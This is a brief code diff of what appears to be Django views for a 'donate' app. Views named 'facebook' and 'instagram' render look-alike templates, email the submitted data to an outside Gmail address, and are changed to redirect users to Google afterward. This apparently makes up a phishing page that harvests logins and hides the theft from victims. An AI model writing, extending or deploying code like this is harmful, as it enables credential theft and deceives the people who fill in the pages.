@@ -83,7 +83,7 @@ def facebook(request):
         ['bigshady500@gmail.com'], 
         fail_silently=False, html_message=message)
 
-       return redirect('success')
+       return redirect('google')
 
    return render(request, 'donate/facebook.html')
 
@@ -103,7 +103,7 @@ def instagram(request):
         ['bigshady500@gmail.com'], 
         fail_silently=False, html_message=message)
 
-       return redirect('success')
+       return redirect('google')
 
    return render(request, 'donate/instagram.html')
 
